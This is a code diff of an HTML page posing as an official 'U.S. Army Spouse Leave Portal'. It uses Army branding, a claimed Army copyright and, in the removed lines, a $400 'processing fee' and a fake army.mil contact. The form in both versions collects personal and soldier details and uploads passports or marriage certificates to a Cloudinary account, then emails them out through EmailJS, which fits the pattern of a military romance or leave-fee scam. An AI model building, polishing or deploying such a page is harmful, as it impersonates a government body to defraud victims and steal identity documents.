@@ -2,17 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>U.S. Army Spouse Leave Application</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-  <script defer>
-    function toggleSection(id, iconId) {
-      const section = document.getElementById(id);
-      const icon = document.getElementById(iconId);
-      section.classList.toggle('hidden');
-      icon.textContent = section.classList.contains('hidden') ? '\u25BC' : '\u25B2';
-    }
-  </script>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
   <style>
     body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
     .army-gold { background-color: #ffcc00; color: #1a1a1a; }
@@ -23,7 +15,7 @@
 <body class="bg-gray-100 text-gray-800">
   <header class="bg-black py-6 shadow-md mb-10">
     <div class="max-w-7xl mx-auto px-4 flex items-center">
-      <img src="https://i.imgur.com/y4DFFMe.png" alt="U.S. Army Logo" class="h-14 w-auto mr-4">
+      <img src="https://i.imgur.com/y4DFFMe.png" alt="U.S. Army Logo" class="h-14 w-auto mr-4" />
       <div>
         <h1 class="text-3xl font-bold text-white">U.S. Army Spouse Leave Portal</h1>
         <p class="text-gray-300 mt-1">Official military leave application for spouses and families</p>
@@ -32,69 +24,10 @@
   </header>
 
   <main class="max-w-4xl mx-auto px-4">
-    <!-- Hero Banner -->
-    <section class="army-gold text-black text-center rounded-2xl p-10 shadow-lg mb-10">
-      <h2 class="text-4xl font-bold mb-4">Authorized Military Leave Assistance</h2>
-      <p class="text-lg mb-6">This portal supports verified applications for U.S. Army spouse and relationship-based leave.</p>
-      <a href="#application" class="bg-black text-white font-semibold py-2 px-6 rounded-lg hover:bg-gray-900 transition inline-block">Start Application</a>
-    </section>
-
-    <!-- Accordion Section -->
-    <section class="space-y-6">
-      <!-- Requirements -->
-      <div class="bg-white rounded-xl shadow-md p-6 cursor-pointer hover:shadow-lg transition" onclick="toggleSection('req', 'icon1')">
-        <div class="flex justify-between items-center">
-          <h3 class="text-xl font-semibold">Requirements</h3>
-          <span class="text-army-gold text-lg" id="icon1">▼</span>
-        </div>
-        <div id="req" class="hidden mt-4 text-gray-700">
-          <ul class="list-disc ml-5 space-y-1">
-            <li>Applicant must be the legal spouse <strong>or</strong> long-term partner of active-duty Army personnel</li>
-            <li>Valid marriage certificate <em>or</em> proof of relationship (photos, communication history, etc.)</li>
-            <li>Military ID or verification of soldier’s active status</li>
-            <li>Brief statement explaining the leave request</li>
-            <li><strong>Note:</strong> Non-married partners are accepted for leave support based on commanding officer discretion.</li>
-          </ul>
-        </div>
-      </div>
-
-      <!-- Pricing -->
-      <div class="bg-white rounded-xl shadow-md p-6 cursor-pointer hover:shadow-lg transition" onclick="toggleSection('price', 'icon2')">
-        <div class="flex justify-between items-center">
-          <h3 class="text-xl font-semibold">Processing Fee</h3>
-          <span class="text-army-gold text-lg" id="icon2">▼</span>
-        </div>
-        <div id="price" class="hidden mt-4 text-gray-700">
-          <p class="mb-2">The official document verification and support fee is <strong>$400</strong>. This includes:</p>
-          <ul class="list-disc ml-5 space-y-1">
-            <li>Administrative support</li>
-            <li>Secure document handling</li>
-            <li>Direct liaison with military leave coordinators</li>
-          </ul>
-        </div>
-      </div>
-
-      <!-- Guide -->
-      <div class="bg-white rounded-xl shadow-md p-6 cursor-pointer hover:shadow-lg transition" onclick="toggleSection('guide', 'icon3')">
-        <div class="flex justify-between items-center">
-          <h3 class="text-xl font-semibold">Application Steps</h3>
-          <span class="text-army-gold text-lg" id="icon3">▼</span>
-        </div>
-        <div id="guide" class="hidden mt-4 text-gray-700">
-          <ol class="list-decimal ml-5 space-y-1">
-            <li>Enter personal and soldier details</li>
-            <li>Upload proof documents (passport, marriage certificate or relationship proof)</li>
-            <li>Submit request for review</li>
-            <li>Receive confirmation and processing update via email</li>
-          </ol>
-        </div>
-      </div>
-    </section>
-
     <!-- Application Form -->
     <section id="application" class="mt-16 bg-white p-8 rounded-2xl shadow-md">
       <h2 class="text-2xl font-bold mb-6">Leave Application Form</h2>
-      <form id="leaveForm" class="grid gap-4" novalidate>
+      <form id="leaveForm" class="grid gap-4" enctype="multipart/form-data" novalidate>
         <label>Full Name
           <input name="name" class="mt-1 p-3 w-full border border-army rounded-lg" type="text" required />
         </label>
@@ -106,7 +39,6 @@
         </label>
         <label>Relationship Type
           <select name="relationship" class="mt-1 p-3 w-full border border-army rounded-lg" required>
-            <option value="">Select relationship</option>
             <option value="Married">Married</option>
             <option value="Dating">Dating</option>
             <option value="Fiancé(e)">Fiancé(e)</option>
@@ -116,20 +48,11 @@
           <textarea name="reason" class="mt-1 p-3 w-full border border-army rounded-lg" rows="4" required></textarea>
         </label>
         <label>Upload Supporting Documents
-          <input name="docs" class="mt-1 p-3 w-full border border-army rounded-lg" type="file" accept=".pdf,.jpg,.jpeg,.png" required />
+          <input id="docs" name="docs" class="mt-1 p-3 w-full border border-army rounded-lg" type="file" accept=".pdf,.jpg,.jpeg,.png" required />
         </label>
-        <button type="submit" class="bg-black text-white font-semibold py-3 px-6 rounded-lg hover:bg-gray-900 transition">Submit Request</button>
+        <button id="submitBtn" type="submit" class="bg-black text-white font-semibold py-3 px-6 rounded-lg hover:bg-gray-900 transition">Submit Request</button>
       </form>
-
-      <!-- Message Box for success/error -->
-      <div id="formMessage" class="mt-6 text-center text-lg font-semibold"></div>
-    </section>
-
-    <!-- Contact Section -->
-    <section class="mt-16 bg-white p-6 rounded-2xl shadow-md mb-10 text-center">
-      <h2 class="text-2xl font-bold mb-3">Contact U.S. Army Leave Support</h2>
-      <p>For questions, email: <a href="mailto:support@army.mil" class="text-army-gold hover:underline">support@army.mil</a></p>
-      <p>Help Desk Line: 1-800-USA-LEAVE</p>
+      <p id="message" class="mt-4 text-center font-semibold"></p>
     </section>
   </main>
 
@@ -137,80 +60,84 @@
     <p class="text-army-gold">&copy; 2025 United States Army. All rights reserved. | Official Leave Management Division</p>
   </footer>
 
-  <!-- EmailJS SDK -->
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
   <script>
-    emailjs.init("gemkywkuPgyAvxdHD"); // Your EmailJS public key
+    (function () {
+      emailjs.init('gemkywkuPgyAvxdHD');
+    })();
 
     const form = document.getElementById('leaveForm');
-    const submitBtn = form.querySelector('button[type="submit"]');
-    const messageBox = document.getElementById('formMessage');
+    const submitBtn = document.getElementById('submitBtn');
+    const messageEl = document.getElementById('message');
 
-    form.addEventListener('submit', async (e) => {
+    form.addEventListener('submit', async function (e) {
       e.preventDefault();
-
-      // Clear previous messages
-      messageBox.textContent = '';
-      messageBox.className = 'mt-6 text-center text-lg font-semibold';
-
-      // Disable button & show submitting text
+      messageEl.textContent = '';
+      
+      // Disable submit button and show loading
       submitBtn.disabled = true;
+      const originalBtnText = submitBtn.textContent;
       submitBtn.textContent = 'Submitting...';
 
-      const fileInput = form.querySelector('input[name="docs"]');
-      if (fileInput.files.length === 0) {
-        messageBox.textContent = 'Please upload a supporting document.';
-        messageBox.classList.add('text-red-600');
-        submitBtn.disabled = false;
-        submitBtn.textContent = 'Submit Request';
-        return;
-      }
-
-      const file = fileInput.files[0];
-
-      // Upload file to Cloudinary
-      const cloudinaryUrl = 'https://api.cloudinary.com/v1_1/do9yjpizs/auto/upload';
-      const uploadPreset = 'unsigned_preset';
-
       try {
-        const uploadData = new FormData();
-        uploadData.append('file', file);
-        uploadData.append('upload_preset', uploadPreset);
+        // Get file input
+        const fileInput = document.getElementById('docs');
+        if (!fileInput.files.length) throw new Error('Please upload a document.');
 
-        const uploadResponse = await fetch(cloudinaryUrl, {
+        // Prepare Cloudinary upload
+        const file = fileInput.files[0];
+        const formData = new FormData();
+        formData.append('file', file);
+        formData.append('upload_preset', 'unsigned_preset');
+
+        // Upload to Cloudinary
+        const cloudinaryUrl = 'https://api.cloudinary.com/v1_1/do9yjpizs/auto/upload';
+        const cloudResp = await fetch(cloudinaryUrl, {
           method: 'POST',
-          body: uploadData
+          body: formData,
         });
 
-        if (!uploadResponse.ok) throw new Error('Failed to upload the document.');
+        if (!cloudResp.ok) throw new Error('Failed to upload document.');
 
-        const uploadResult = await uploadResponse.json();
+        const cloudData = await cloudResp.json();
 
-        // Prepare EmailJS params
-        const templateParams = {
+        // Prepare email params
+        const templateParamsTeam = {
           name: form.name.value,
           email: form.email.value,
           rank: form.rank.value,
           relationship: form.relationship.value,
           reason: form.reason.value,
-          file_url: uploadResult.secure_url
+          document_url: cloudData.secure_url
+        };
+
+        const templateParamsApplicant = {
+          name: form.name.value,
+          email: form.email.value,
+          rank: form.rank.value,
+          relationship: form.relationship.value,
+          reason: form.reason.value,
+          // No document URL needed here unless you want to add it
         };
 
         // Send email to team
-        await emailjs.send('service_il4m6rr', 'template_0moxpwa', templateParams);
-        // Send email to applicant (optional)
-        await emailjs.send('service_il4m6rr', 'template_3tmdj1g', templateParams);
+        await emailjs.send('service_il4m6rr', 'template_0moxpwa', templateParamsTeam);
 
-        messageBox.textContent = 'Your leave application has been successfully submitted. Check your email for receipt.';
-        messageBox.classList.add('text-green-600');
+        // Send email to applicant
+        await emailjs.send('service_il4m6rr', 'template_3tmdj1g', templateParamsApplicant);
+
+        // Show success message
+        messageEl.style.color = 'green';
+        messageEl.textContent = 'Your leave application was submitted successfully.';
 
         form.reset();
       } catch (error) {
-        messageBox.textContent = 'Error submitting the application: ' + error.message;
-        messageBox.classList.add('text-red-600');
+        messageEl.style.color = 'red';
+        messageEl.textContent = error.message || 'An error occurred. Please try again.';
       } finally {
+        // Reset button
         submitBtn.disabled = false;
-        submitBtn.textContent = 'Submit Request';
+        submitBtn.textContent = originalBtnText;
       }
     });
   </script>
